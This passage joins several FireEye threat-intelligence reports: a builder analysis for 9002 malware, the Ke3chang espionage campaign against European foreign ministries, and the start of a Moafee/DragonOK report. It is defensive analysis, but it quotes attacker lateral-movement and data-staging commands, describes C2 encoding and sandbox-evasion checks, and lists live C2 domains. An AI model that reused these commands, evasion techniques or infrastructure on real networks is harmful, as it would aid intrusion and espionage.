The Piping linked samples had compile timestamps between December 19 , 2012 and January 2 , 2013 .
All of the samples from this campaign were packaged with the Sunshop PE resource , and none was signed with a digital certificate .
When executed , the Piping samples called back to these CnC servers : The campaign targeted these industries : The Update1 campaign appears to utilize strategic Web compromise as an initial infection vector .
We identified five different samples linked to the Update1 campaign .
All of these samples were detected as Trojan . APT.9002 and had compile timestamps between July 30 , 2012 and December 19 , 2012 .
One of the Update1 samples was packaged with the Sunshop PE resource and one was packaged with the DTL PE resource .
None of the samples was signed with a digital certificate .
When executed , the Update1 samples called back to these CnC servers : The campaign targeted these industries : • High - tech • Entertainment / Media / Hospitality • Applied research and development • Services / Consulting / VAR The Packets campaign appears to utilize spear - phishing email as an initial infection vector .
We identified one Trojan . APT.9002 sample linked to the Packets campaign .
This sample had a compile time of December 19 , 2012 and was packaged with the Sunshop PE resource .
The sample was not signed with a digital certificate .
It called back to this CnC server : mlog.ddns [ .
] us The Allshell campaign appears to utilize spear- phishing email as a vector to attack its targets .
We identified one Trojan . APT.9002 sample linked to the Allshell campaign .
This sample had a compile time of October 16 , 2012 and was packaged with the DTL PE resource .
The sample was not signed with a digital certificate .
It called back to this CnC server : • stmp.allshell [ .
] net The campaign targeted these industries : • High - tech • Aerospace / Defense / Airlines These observed shared characteristics across these malware samples are likely the result of a set of common `` builders '' developed by a shared development and logistics infrastructure .
Builders are tools used by malicious actors to quickly and easily create different variants of the same malware .
In a typical scenario , a skilled developer creates a builder and shares it with an operator more skilled in intrusion operations than in code development .
This separation of tasks is more efficient and supports a faster tempo of offensive operations .
A typical builder provides a graphical user interface that enables a threat actor to configure elements such as the location of the CnC server .
To recap , these shared characteristics , as discussed in previous sections , include the following : • The Sunshop and DTL PE resources • Common import tables • Six different digital certificates • Common compile times • Common malware families Figure 9 : Typical Builder life cycle We identified a builder tool used to create Trojan . APT.9002 binaries , which we are dubbing `` 9002 Builder .
'' This builder generates Trojan . APT.9002 binaries with the DTL resource .
As shown in Figure 10 , the dialogue and menu options in this GUI are in Chinese .
The builder enables threat actors to configure the following : • Both a primary and a secondary CnC server .
• A specific ID .
The default ID produced by this builder is `` 1 .
'' • An `` Internet health check '' domain .
The default health check domain configured in this builder was `` update.microsoft.com '' .
An Internet health check domain is typically used by malware to determine whether a target 's endpoint is connected to the Internet before acting .
• Proxy settings , including address / port , type , proxy authentication details , auto - detect proxy , and force - proxy only .
Also , the text in the title bar of this builder is '' [ User_Server_Builder ] update 2012 - 7 - 21 '' .
Although the servers produced by this builder have a compile time of 10/23/12 8:30 UTC , we believe the date in the title bar of the builder is significant ; we identified five different binaries with a compile time of 7/21/12 .
All five utilized the same DTL resource found in 9002 Builder .
The 9002 Builder appears to be a modified variant of the builder used to create the samples listed in Table 12 .
The compile time of the builder is 10/23/2012 11:18 UTC , a little less than 3 hours after the compile time of the server that is produced by it .
We believe it is a common practice for the developer to compile a new server , update the builder code accordingly , then compile the new builder .
The older date in the title bar may just be an oversight as i t would have to be manually updated by the developer .
The builder contains a copy of the server executable in its PE resource section , under BIN .
The server executable is responsible for installing the 9002 payload malware , and has its configuration block stored in its .data
section , with some default settings including the CnC pointing to 192.168.8.105 .
The configuration block uses simple , single - byte XOR encryption .
The key varies from version to version ; in some cases , it skips null bytes .
During the installation routine , the configuration block is written to the registry value sysinfo under the registry key HKCU\Software\Classes .
When the threat actor builds a malware executable , the builder writes the server executable to disk and overwrites the configuration block with the newly configured options .
The location of the configuration block within the .data
section is hard - coded , meaning that the builder must be modified each time the server code is updated and the location of the configuration block changes .
We noticed that the configuration block is indeed stored at a different offset in the samples compiled on 7/21/12 as compared to the sample created by the builder we have with the compile date of 10/23/12 .
This further supports our belief in the practice of the developer compiling the server and then shortly after compiling the builder .
He would need time to locate the new offset of the configuration block in the newly compiled server executable and then change the hard - coded value in the builder code .
Attackers using 9002 Builder seem to have gradually adopted another launcher that stores the configuration block as a resource instead of storing it in its .data
section .
Based on the compile - time analysis outlined in the `` Compile Times '' section of this report , the shift began in late October of 2012 ( with a few exceptions ) .
This shift makes sense for the builder 's developer ( s ) ; they no longer needed to update the builder for every code change in the launcher or 9002 payload malware .
This launcher , mentioned earlier in this paper as having the import table hash 3a7faeac22e6ab5c3c28a2b617901b51 , supports different payloads , such as Poison Ivy and 9002 .
Based on the evidence provided , we draw the following possible conclusions : [ High Confidence ] SDQ exists and supports separate APT campaigns .
We believe the most likely explanation for these documented correlations is that a shared ' development and logistics ' operation ( SDQ ) supports a number of different APT campaigns , as part of formal offensive apparatus .
[ Low Confidence ] SDQ and APT campaigns are a single actor .
That said , it is conceivable that the 11 clusters of activity , previously believed to be independent campaigns run by different actors , are in fact one cluster of activity run by one well - resourced actor .
However , we believe this scenario is less likely because each cluster of activity utilized malware samples with different artifacts such as passwords , campaign identifiers , and mutexes .
These artifacts were generally consistent within each cluster of activity but differed across clusters .
[ Medium Confidence ] SDQ does not exist , and APT actors informally share among each other .
Alternatively , different actors might be responsible for the documented 11 clusters of activity and instead of relying on a centralized development and logistics operation , these actors share TTPs through formal or informal channels .
In each of these scenarios , a shared development and logistics infrastructure or some notion of a digital quartermaster clearly underpins all of the activity presented in this report .
Whether this quartermaster involves informal connections between developers or a structured bureaucratic organization serving a central offensive apparatus is unclear .
Regardless of the scenario , the overall finding of a shared development and logistics infrastructure suggests targeted organizations are facing a more organized menace than they realize .
FireEye has invented a purpose - built , virtual machine - based security platform that provides real - time threat protection to enterprises and governments worldwide against the next generation of cyber attacks .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye Threat Prevention Platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors , including mobile , Web , email , and files and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
FireEye has over 1,100 customers across more than 40 countries , including over 100 of the Fortune 500 .
FireEye , Inc. | 1440 McCarthy Blvd .
Diplomatic missions , including ministries of foreign affairs ( MFA ) , are high - priority targets for today 's cyber spies .
Large - scale cyber espionage campaigns such as `` GhostNet '' have demonstrated that government agencies around the world , including embassies , are vulnerable to targeted cyber attacks .
As the crisis in Syria escalates , FireEye researchers have discovered a cyber espionage campaign , which we call `` Ke3chang , '' that falsely advertises information updates about the ongoing crisis to compromise MFA networks in Europe .
We believe that the Ke3chang attackers are operating out of China and have been active since at least 2010 .
However , we believe specific Syria - themed attacks against MFAs ( codenamed by Ke3chang as `` moviestar '' ) began only in August 2013 .
The timing of the attacks precedes a G20 meeting held in Russia that focused on the crisis in Syria .
FireEye gained visibility into one of 23 known command - and - control ( CnC ) servers operated by the Ke3chang actor for about one week .
During this time , we discovered 21 compromised machines connecting to the CnC server .
These included what appear to be three administrative tests by the attackers and two connections from other malware researchers .
Among the targets , we identified nine compromises at government ministries in five different European countries .
Eight of these compromises were at MFAs .
When FireEye had visibility on the CnC server , we saw the attackers engage in post - compromise information gathering and lateral movement on the target network , where upon FireEye immediately contacted the relevant authorities and began the notification process .
Alas , poor James Bond .
The days are over when spies had to be both a black belt and Prince Charming in the same scene .
Today , the vast majority of intelligence collection is conducted through signals intelligence .
The ubiquity and vulnerability of the Internet have opened windows into the affairs of Washington , Beijing , and Moscow to a degree that Bond author , Ian Fleming , would never have imagined .
The worldwide deployment of espionage - focused malware has made this generation the Golden Age of espionage .
Global reach , stealthy maneuvers , legal cover , and plausible deniability - what more could a spy ask for ? That is why FireEye focuses on the vexing problem of the advanced persistent threat ( APT ) .
APT activity is best described as a campaign , a series of attacks over time .
Each attack comprises a variety of phases , including reconnaissance , exploitation , command and control , lateral movement , and exfiltration .
Intelligence can be extracted during each phase of the attack to build a full understanding of the tools , techniques , and procedures ( TTPs ) used by a particular APT campaign 's life cycle .
However , network defenders may have only partial visibility into any single incident .
That makes tracking and correlating activity across multiple related incidents critical .
The Ke3chang attackers have been active since at least 2010 .
Tracking their activity over time has revealed information on their targeting preferences and the malware tools they use .
The attackers have used three types of malware over the years and have traditionally targeted the aerospace , energy , government , high - tech , consulting services , and chemicals / manufacturing / mining sectors .
However , the number of attacks against entities in these sectors has been small .
The scarcity of individual attacks may indicate the attackers are selective about their targets .
During August 2013 , FireEye gained visibility on one of 22 CnC servers used at that time by the Ke3chang attackers .
In addition to confirming compromised endpoints at several MFAs , FireEye gained unique insight into the attackers ' lateral movement activities .
In this report , we present the historical intelligence we have gathered on the Ke3chang campaign , as well as an in - depth assessment of the ongoing Syrian - themed attacks against these MFAs .
Our objective is to arm network defenders with information to combat this threat actor .
Traditionally , the Ke3chang attackers have used spear - phishing emails with either a malware attachment or a link to a malicious download .
They have also leveraged a Java zero - day vulnerability ( CVE-2012 - 4681 ) , as well as older , reliable exploits for Microsoft Word ( CVE-2010 - 3333 ) and Adobe PDF Reader ( CVE-2010 - 2883 ) .
The Ke3chang attackers have also sent Windows screensaver files ( .scr
) and executable files ( .exe
) using the Unicode Right - To - Left - Override ( RTLO ) technique to cloak the original filename extension from the targeted user .
In addition to the recent Syria - themed campaign , they also used a London Olympics - themed campaign in 2012 and one that involved former model and French first lady Carla Bruni in 2011 .
Over the years , the Ke3chang attackers have used three types of malware that we call : `` BS2005 '' , '' BMW '' , and `` MyWeb '' .
We believe these three types of malware are an evolution of a single project from a single developer or small team of developers sharing code .
Functionally , it is a typical first stage backdoor commonly found in APT attacks .
It has the ability to upload and download files , run shell commands , and sleep for a configurable length of time .
All of the CnC communications are performed over the HTTP protocol .
The current Ke3chang campaign leverages the BS2005 malware , while older activity from 2010 - 2011 leveraged BMW , followed by the MyWeb malware sporadically used in between .
Just as the media began to report on possible U.S. military intervention in Syria , the Ke3chang attackers began to use this topic as a lure to trick their targets into running their malware .
Although attackers routinely employ breaking news as lures , the targets of this campaign , codenamed by Ke3chang as '' moviestar '' , were various ministries of foreign affairs in Europe .
The malware used in this most recent campaign is known as `` BS2005 '' .
One sample was located in a ZIP file named `` US_military_options_in_Syria.zip '' ( 6cb633b371700d1bd6fde49ab38ca471 ) and contained the file `` US_military_options_in_Syria.pdf.exe '' ( b68a16cef982e6451ddf26568c60833d ) .
This executable is a `` loader '' that contains the process debugging ( PDB ) string : Upon execution , the loader drops another executable `` ie.exe '' ( 277487587ae9c11d7f4bd5336275a906 ) that contains the following PDB string : This executable has a compile date of 2013/07/25 and BS2005 is the most recent iteration of the backdoor .
Upon execution of `` ie.exe '' , it beacons to a CnC host , named cascais.epac.to ( IP : 122.10.83.51 ) , with the following HTTP traffic pattern : Although this sample uses the `` /p3oahin/ '' path , we have observed earlier samples that used the path `` /ke3chang/ '' and `` /shfam9y/ .
'' The sample we analyzed randomly chooses the < filename > to use in the URL from the following hard - coded list : • albumtop.aspx • blogvideo.aspx • celebrity.aspx • modules.aspx • newpage.aspx • pratty.aspx • tieback.aspx • ugctag.aspx • verycd.aspx • worldcat.aspx In addition , each sample contains a mark or campaign tag , embedded in the Base64 callback payload that allows the attackers to keep track of their various campaigns .
In this case , the mark in the Syria - themed iteration of this campaign was consistently the `` moviestar '' tag .
Each byte of the CnC data goes through the following transformation : • The data has 0x27 plus its positional index number added to it • It is then XOR 'd with its positional index number • This data is then Base64 encoded , with ' + ' characters being replaced with ' * ' characters when the data is transmitted as a parameter in the URL The Base64 data for the ' r ' parameter decodes and decrypts to the following data format : < Local IP address > < Computer name > < Domain > < Campaign marker > < Date / Time > < Command identifier > < Volume serial number > < yes / no / nn > < empty line > < empty line > In this format , the < yes / no / nn > indicates whether more data is available for command output or file upload .
An `` nn '' refers to NOP / NOOP ( `` NO OPeration '' -a beacon signal ) .
Various versions of the BS2005 malware will use a different constant for the addition part of the encryption routine and contain other information , such as the following : • Installed mail client • Internet Explorer version • Windows version • Whether a proxy server is configured • Whether a virtual machine was detected In addition to the Base64 data in the URI of the HTTP POST , the BS2005 malware also includes Base64 data in the body of the HTTP POST .
The Base64 data for the POST body decodes and decrypts to one of the following : `` no , '' uploaded file content , or the output from the previous command .
Once the HTTP POST completes , the response is an HTML page with a hidden form ( see Figure 3 ) .
A particular string sequence is expected , which contains a command ID and delimited parameters .
All three malware families that FireEye analyzed ( BS2005 , MyWeb , and BMW ) follow a similar CnC pattern in their HTTP replies .
At least one of the BS2005 samples contained a simple anti - virtual machine heuristic .
Specifically , the GetTickCount function is called and a loop is executed 999,999,990 times that simply increments a variable .
After this loop completes , GetTickCount is called again and the values are compared .
If they are the same , the process terminates .
A trait common to all three malware families we analyzed is that they use the IWebBrowser2 COM interface to perform their CnC communication .
This programming interface allows the programmer to reuse code from an existing browser ( typically Internet Explorer ) to perform Web browsing , simplifying the development process .
The network communication is actually performed through the browser process , causing some misdirection when it comes to determining which process is ultimately responsible for generating this network traffic .
This technique is nothing new for malware , but FireEye did notice something interesting in BS2005 's behavior .
BS2005 attempts to kill any processes named `` maxthon.exe '' or `` 360se.exe .
'' The `` 360se.exe '' process seems to make sense , because it relates to 360 Chinese anti - virus software .
But why the malware would be programmed to terminate Maxthon , a free browser developed by a Chinese company , was initially unclear .
Upon further investigation , we found that if a Maxthon browser is open while the BS2005 malware uses this IWebBrowser2 COM interface to navigate to a Web page , the Maxthon browser opens a new tab and visibly navigates to the Web page itself .
Instead of using other APIs to make Web requests and read responses , the BS2005 developer apparently dealt with this issue by simply killing any Maxthon browser processes running on the target computer .
This lack of sophistication is present throughout the code in all three malware families ( BS2005 , MyWeb , and BMW ) .
BS2005 is actually the most complex of the three , which makes sense given that it is the most recent malware family we have seen .
Improvements in the BS2005 version of the malware include a `` sleep until date / time '' command and weak encryption for all CnC data ; previous iterations ( MyWeb and BMW ) did not encrypt the host information sent in the beacon .
In 2011 a campaign , labeled `` snake '' by the attackers , started using the theme of nude photos of the French prime minister 's wife , Carla Bruni , as a lure .
Attackers sent an email to various targets that encouraged recipients to download a password - protected RAR file ( see Figure 5 ) .
The malware contained within the RAR was named `` carla_bruni_nude_pics_spp.scr '' ( 727ef86947f5e109435298e077296a42 ) .
When executed , the BS2005 malware connected to a CnC server with the following HTTP traffic pattern : The CnC server 's hostname in this case contains the string `` g20news '' ; because of this , FireEye believes that the targets of the `` snake '' campaign may have been related to the G20 finance ministers meeting held in Paris , France on October 15 , 2011 .
In 2012 , another series of attacks began that leveraged information about the London Olympics in an attempt to lure targets into clicking on malicious attachments ( see Figure 6 and Figure 7 ) .
Based on information from the FireEye® Dynamic Threat Intelligence™ ( DTI ) cloud , we observed that this campaign targeted a single firm in the Chemicals / Manufacturing / Mining sector .
These attacks leveraged older exploits in Adobe PDF Reader ( CVE-2010 - 2883 ) and Microsoft Word ( CVE-2010 - 3333 ) .
These BS2005-laced samples ( ecc1167a5f45d72c899303f9bbe44bbc and b391d47b37841741a1817221b946854a ) connected to the following CnC servers : • news.studenttrail.com • skyline.ns1.name The HTTP callback pattern to the CnCs in these cases was modified slightly from the earlier path of `` /ke3chang/ '' to `` /shfam9y/ '' .
This could represent an attempt to avoid any network - based signatures that detect based on the specific URL path of earlier samples .
Lastly , the addition constant for the CnC encryption routine in these two BS2005 samples is 0x7C .
Three months after the Olympics - themed attacks , FireEye observed a new BS2005 campaign labeled `` newtiger , '' which is possibly a reference to an older 2010 campaign labeled `` tiger .
'' The decoy content in this case is a threat report from a well - known security vendor ( see Figure 8 ) .
Using information from the FireEye DTI cloud , FireEye observed that this campaign targeted a single firm in the Services / Consulting sector .
The sample used in this attack ( 50dd931b85891168244a10073f4a6f79 ) dropped BS2005 malware that connected to the CnC www.trap.dsmtp.com and used the `` /shfam9y/ '' URI path .
The Ke3chang attackers used the older `` MyWeb '' malware family from 2010 to 2011 .
The MyWeb sample that FireEye analyzed has a compile date of 1/20/2011 .
At least one of the attacks in this campaign leveraged a European security and defense - themed lure , which aligns with the targeting preferences for this group .
MyWeb is the second - generation malware used by this threat actor ; it was used after BMW but before BS2005 .
Improvements over BMW include an anti - sandbox detection technique , a configurable sleep value for the CnC beacon loop , and a consolidated configuration block that enables the malware author to change the CnC domain without having to recompile the malware .
MyWeb 's anti - sandbox detection technique calls GetSystemTime , saving the value , then looping 500,000 times calling GetSystemTime for each loop ; finally , the malware compares the milliseconds value of the last call with the value saved from the first call .
If the values are equal , the malware process terminates silently .
The MyWeb configuration is stored in a 104-byte block of encoded data appended to the end of the portable executable ( PE ) file .
To decode the configuration data , each character has its positional index number added to it .
The CnC domain is stored at offset 0x0 .
Upon successful connection to the CnC server , the malware sleeps for the amount of time that is stored in seconds at offset 0x20 .
The sleep value used for CnC connection failures is stored in minutes at offset 0x30 .
MyWeb only encrypts the command results data sent back to the CnC server using the same weak encryption algorithm as BS2005 ( see Figure 2 ) .
The addition constant for the encryption routine for the sample we analyzed ( be58180f4f7ee6a643ab1469a40ffbca ) is 0x5A .
The beacon data is transmitted in URL parameters in plaintext and is self - explanatory : Downloaded and uploaded files are simply Base64 encoded .
Command results are encrypted and then Base64 encoded .
BMW is the earliest iteration of this malware that FireEye has seen and was used by the Ke3chang attackers in older 2010 attacks .
The initial infection vector is unknown ; however , BMW was presumed to be delivered via weaponized email attachments / links - similar to the newer campaigns leveraging MyWeb and BS2005 .
The samples we analyzed have a compile date of 2010/07/08 .
This malware is known as BMW , due to the presence of this PDB string : BMW sample ( 649691e1d367721f0ff899fd31133915 ) beacons to CnC mail.yahoo.sendsmtp.com with the following fake HTTP traffic : The < filename > in the URI is randomly chosen from one of the following hard - coded entries within the malware binary : • acheb.aspx • bajree.aspx • cyacrin.aspx • dauber.aspx • eaves.aspx The Base64 encoded data in the POST body decodes to the following : The < Y / N > data indicates whether the malware is running inside a virtual machine .
The < X Bytes > data indicates the number of bytes last downloaded from the download file command .
BMW encrypts uploaded and downloaded files and command results before Base64 encoding them , using the same weak encryption algorithm as BS2005 ( see Figure 2 ) .
The constant used for addition in the sample we analyzed is 0x5A .
Malware Family Matrix Table 1 is a complete list of all samples that were analyzed as part of this investigation , along with any known URI variances , campaign markers , and decoy or lure themes used by this threat actor .
The Ke3chang attackers ' CnC infrastructure relies primarily on domains obtained from dynamic DNS providers .
The attackers shift IP addresses frequently and often point their CnC domains to legitimate IP addresses when they are not in use .
To date , we have observed the following domains used by each of these malware families : BS2005 • g20news.ns01.us • news.studenttrail.com • skyline.ns1.name • www.trap.dsmtp.com • ftp.backofficepower.com • news.freewww.info • blackberry.dsmtp.com • adele.zyns.com • windowsupdate.serveuser.com • officescan.securitynh.com • yahoo.concursv.com • cascais.epac.to • www.errorreporting.sendsmtp.com • www.sumba.freetcp.com • google.winfy.info • cname.yahoo.sendsmtp.com BMW • mail.yahoo.sendsmtp.com • update.msntoole.com MyWeb • expo2010.zyns.com • win7.sixth.biz • ensun.dyndns.org • www.spaces.ddns.us • blog.strancorproduct.info We have mapped out the relationship between the CnC servers for all three malware families and have found that they have shared common historical IP addresses in the past .
Using the IP addresses from the 23 CnC servers FireEye collected from our initial samples , we then mapped all the IP addresses that these domains resolved to .
We then collected any other domains that also resolved to these IP addresses , resulting in at least 99 possible Ke3chang CnC servers .
Upon further analysis , we find that these 99 CnC servers are primarily located in the U.S. , China , and Hong Kong .
Upon accessing one of the Ke3chang CnC servers , we found that the attackers have a Web - based control panel that allows them to interact with compromised computers , as shown in Figure 14 .
The control panel also contains a link to an `` AutoScanner '' feature that includes several preconfigured commands to gather information about a compromised system and perform network reconnaissance on the endpoint ( see Figure 15 ) .
Once a compromised system connects to the CnC server , the Ke3chang attackers follow a predetermined script .
They first gather information about the local computer and the network to which it is connected .
FireEye found the following tools on the CnC server , which the attackers used to steal logon credentials and move laterally across the network : • a7b20fe0bc6ae7f7a24670a732d2a021 gs.exe gsecdump v0.7 by [ REDACTED ] ( [ REDACTED ] @ truesec.se ) • 291503be3c25e52382f2a54420d03d71 gsl.exe gsecdump v0.6 by [ REDACTED ] ( [ REDACTED ] @ truesec.se ) • 8cdc9ffadbe4aad9418580b6ba2cc252 nete.exe NetE v1.0 Questions , comments , bitches and bugs to [ REDACTED ] @ cultdeadcow.com • 8cf6e698ecf3e167321a3ed2b9a9c62f PwDul2.exe 8cf6e698ecf3e167321a3ed2b9a9c62f PwDump62.l.exe Usage : PwDul2.exe [ -x ] [ -n ] [ -h ] [ -o output_file ] [ -u user ] [ -p password ] [ -s share ] machineName After running the standard commands available in the AutoScanner , the attackers often used the '' net group '' command to acquire information about specific network groups revealed in the pre- configured commands .
This step was done manually ; we found several instances of typing errors , such as the following : • net group `` [ REDACTED ] '' /doamin • net group /doamin The attackers then listed information for specific users , focusing on users and groups suspected of possessing advanced rights such as domain administrators and service accounts that have access to a wide range of systems .
Then they used the `` net use '' command to map network drives , including some that required a password , as follows : • net use \\ [ REDACTED ] [ REDACTED ] : J : /user : [ REDACTED ] In some cases , they appeared to try and move laterally by copying a file ( always initially called '' msn.tmp '' ) to other machines on the network .
They frequently changed the destination directory and filename of the target file , presumably to make finding the malware more difficult for incident responders upon initial discovery .
• net use \\172.xx.xx.x [ REDACTED ] /u:172.xx.xx.x\ [ REDACTED ] • dir \\172.xx.xx.x\c $ • dir `` \\172.xx.xx.x\c $ \Program Files\Adobe '' • copy C : \Users\ [ REDACTED ] \AppData\Local\Microsoft\Windows\msm.tmp `` \\172.xx.xx.x\c $ \Program Files\Common Files\Adobe\ARM\1.0\AdobeARM.exe '' /y The attackers then deleted the network shares : • net use \\ [ REDACTED ] /del After that , attackers gathered specific data of interest ( such as the listings of all files in certain directories ) , and compressed it all within the RAR archive as follows : • % temp % /wmp32.dll a -m5 –hp [ REDACTED ] % temp % /tem.rar % temp % \*dir * .
* They then checked the RAR archive , uploaded it to the CnC server , and deleted the archive from the compromised system : • dir % temp % /tem.rar • del C : \DOCUME~1\ [ REDACTED ] \ [ REDACTED ] \Temp\tem.rar During our window of visibility , FireEye found evidence that the attackers were able to enumerate the various target networks , move laterally to compromise new systems , and finally to gather information that was compressed and uploaded to the CnC server .
However , FireEye lost visibility on this Ke3chang CnC server before the attackers shifted to the major data exfiltration phase .
Determining attribution requires more than just malware analysis .
It requires an understanding of the attackers activities across the attack life cycle ( or `` kill chain '' ) , along with an assessment of contextual indicators , such as the targeting , timing , and scope of the attacks .
Unfortunately , this level of visibility is not always available , which often leaves significant gaps in analysis .
Therefore , exploring competing hypotheses is important , as is recognizing , and acknowledging areas of uncertainty .
Moreover , `` attribution '' can have multiple meanings .
Some use it to refer to an ultimate beneficiary , such as a nation - state , while others use the term to refer to malware authors or CnC operators .
During our investigation , FireEye focused on technical clues left by the malware authors and CnC operators .
Within the malware binaries themselves , linguistic clues point to the malware authors ' use of the Chinese language , as seen in Figure 17 .
In addition , the Ke3chang CnC control panel contains a mix of Chinese and English words and characters .
The subset of CnC servers that were not hosted by dynamic DNS infrastructure was registered using a registrar in China ( XIN NET ) and the WHOIS records indicate that the registrant is in China .
The following email addresses were used to register those non - dynamic CnC domains : • xiaoxiao_222 @ yahoo.com • tk329 @ yahoo.com • zsy @ gmail.com During our period of visibility into the BS2005 `` moviestar '' campaign against various ministries of foreign affairs in Europe , FireEye discovered that the attackers had initially tested the malware in virtual machines , prior to compromising actual targets .
We retrieved the output of the commands the attackers had run when testing the malware .
The output indicates that the Ke3chang attackers are testing their malware in Windows operating systems , with the default language set to Chinese .
Based on this circumstantial evidence we believe that the Ke3chang attackers are operating within China .
But their exact identities and motivation remain unknown .
Ministries of foreign affairs in Europe have been targeted and compromised by a threat actor we call Ke3chang .
This attack used the crisis in Syria as a lure to deliver malware to its targets .
The timing of the attack precedes the G20 meeting in Russia that focused on the crisis in Syria .
Furthermore , FireEye has presented evidence indicating that the Ke3chang attackers have been active since at least 2010 and have attacked targets related to G20 meetings in the past .
During our investigation , we were able to observe the inner workings of one of the CnC servers used by the attackers .
As a result , we were able to identify some of the victims of the attack , as well as gather circumstantial evidence that indicates that the attackers may be operating from China .
During our brief window of visibility into one of the known 22 CnC nodes , FireEye observed the attackers conducting reconnaissance and moving laterally throughout the compromised networks .
Relevant authorities were immediately notified upon this discovery , and FireEye began its worldwide target notification process .
At that time , FireEye did not observe the attackers exfiltrating sensitive data ; however , we believe the Ke3chang attackers likely began attempting to exfiltrate sensitive data shortly thereafter .
Accordingly , diplomatic missions , including ministries of foreign affairs , continue to be targeted by malware - based espionage campaigns .
This report demonstrates that attackers are able to successfully penetrate government targets using exploits for vulnerabilities that have already been patched and despite the fact that these ministries have defenses in place .
This illustrates the limitations of traditional defenses and highlights the need for security strategies that not only leverage advanced technologies designed to defend against targeted threats , but also the incorporation of threat intelligence and an incident response capability .
To learn more about FireEye , visit www . FireEye.com .
FireEye has invented a purpose - built , virtual machine - based security platform that provides real- time threat protection to enterprises and governments worldwide against the next generation of cyber attacks .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye Threat Prevention Platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors , including mobile , Web , email , and files and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
FireEye has over 1,300 customers across more than 40 countries , including over 100 of the Fortune 500 .
© 2013 FireEye , Inc. All rights reserved .
FireEye is a registered trademark of FireEye , Inc. All other brands , products , or service names are or may be trademarks or service marks of their respective owners .
– RPT.OK.EN - US.122013 FireEye , Inc. | 1440 McCarthy Blvd .
In the realm of quantum mechanics , entanglement is a peculiar phenomenon in which a pair of particles takes on the properties of each other , regardless of the distance between them .
Albert Einstein best described this intertwining phenomenon as `` spooky action at a distance '' .
This behavior is analogous to the observed correlation between the two geographically separated attack groups detailed in this paper .
We have uncovered two distinct attack campaigns originating from different geographic regions in China using similar tools , techniques and procedures ( TTPs ) .
In both campaigns , each attack group employed multiple overlapping TTPs to infiltrate their targets , including similar custom built backdoors and remote administration tools ( RATs ) such as CT / NewCT , Mongall and Nflog ( and publicly available RATs such as PoisonIvy ) to maintain access to victim networks .
We also observed the use of another custom backdoor called Sysget / HelloBridge by one of the attack groups , which we believe is possibly shared between the campaigns as well .
Both groups were also used a well - known proxy tool named HTRAN , which is an abbreviation for `` HUC Packet Transmit Tool '' .
This tool proxies connections through intermediate hops and aids the attackers in disguising their true geographical location when interacting with the victim networks .
We also observed both attack groups using similar techniques to evade detection by security products .
In sum , we believe that these groups are from two distinct regions in China and possibly ( 1 ) are collaborating , ( 2 ) received the same training , ( 3 ) have a common toolkit supply chain , or some combination of these three .
The relationship between the two attack groups may be direct or indirect , but based on our current visibility , they seem to have two distinct missions , with each one targeting different industries .
We were able to ascertain the geographical locations of the two attack groups by analyzing their `` HTRAN '' infrastructure over a period of time .
We believe a separate third group may also be employing these tools , but we do not have sufficient insight in to this additional group at this time .
The attack group `` Moafee '' ( named after their command and control infrastructure ) appears to operate out of the Guangdong province in China and is known to target the governments and military organizations of countries with national interests in the South China Sea .
The seas in this region have multiple claims of sovereignty and hold high significance , as it is the second busiest sea - lane in the world and are known to be rich in resources such as rare earth metals , crude oil , and natural gas .
We have also observed the Moafee group target organizations within the US defense industrial base .
The attack group `` DragonOK '' ( named after an event name in one of their payload executables ) appears to operate out of the Jiangsu province in China , and is known to target high - tech and manufacturing companies in Japan and Taiwan .
The propensity to target these industries possibly demonstrates an interest in gaining economic competitive advantage in the region through the acquisition of trade secrets .
The primary observed attack vector used by both groups is spear - phishing emails .
The themes -- or topics - used in the emails from the DragonOK group were well crafted and highly tailored to the target audience .
We also found this attack group using the appropriate language for each of their targets in the phishing emails– such as Japanese and traditional Chinese ( mainly used in Taiwan ) .
The attachments in the email were typically an executable file embedded in a ZIP archive or password - protected Microsoft Office documents .
One such email , shown in Figure 2 and used by the DragonOK group was written in traditional Chinese , and targeted a Taiwanese technology firm We observed both attack groups employ decoy documents in order to help deceive potential victims .
The decoy documents are presented to the victim while the malware runs in the background .
One such Japanese - language decoy documents used by the `` DragonOK '' group is shown below .
It appears to be a resume of someone from Kyoto University in Japan who was involved in English language studies .
Both attack groups employ numerous , yet common techniques in an attempt to evade detection by various sandbox environments , antivirus ( AV ) software , and gateway firewalls .
We observed environment - based evasion , the use of large file sizes , and password - protected documents – each of which are described in the sections below .
The first - stage payload for RATs called `` CT/ NewCT '' used by both the Moafee and DragonOK attack groups employs an evasive '' CPU core check '' technique .
The payload attempts to detect the number of processor cores in the running environment , by calling the `` GetSystemInfo '' API , which returns a structure with system data , including number of cores .
If only one core is detected , it quits as seen in Figure 5 .
This probably is an attempt to detect virtualized environments such as sandboxes , as well as other analysis environments used by reverse engineers , which often tend to be configured with a single core .
We also observed a similar evasion technique within the `` Sysget / HelloBridge '' payload employed by the DragonOK group .
It invokes a similar call to `` GetSystemInfo '' to determine the number of active CPU cores , and the code quits if the system is configured with only one core .
The `` DragonOK '' group in particular is known to use password - protected documents delivered as attachments in emails , with the password listed in the contents of the email .
This method probably is used to evade detection by AV software , gateway firewalls and malware sandboxes .
One such example using the password `` 888888 '' is shown in Figure 2 and Figure 6 , and has been observed by FireEye before .
Another similar sample was referenced by the `` contagio '' blog and used the password `` 8861 '' .
In older phishing emails that link to the tools used by DragonOK and Moafee , we observed an implant over 10 megabytes in size .
It was padded with unnecessary null bytes in the overlay section of the file , in order to increase the file size as shown in Figure 7 .
This probably was done to evade detection , as many host- based and network - based AV engines do not have the ability to scan large files .
This is a first stage payload that drops and runs the NewCT implant .
The first stage payload ( example : 46e55cdf507ef10b11d74dad6af8b94e ) attempts to detect the number of CPU cores in the running environment by calling GetSystemInfo as described in the previous section .
If the CPU core check detects more than one core , it implants the NewCT2 RAT in % temp % \MSSoap . DLL ( some variants will use BurnDCSrv . DLL and IntelAMTPP.DLL ) and executes the written file .
The actual implant is packaged in the resource section of the dropper with a fake bitmap ( BMP ) header , as shown in Figure 8 .
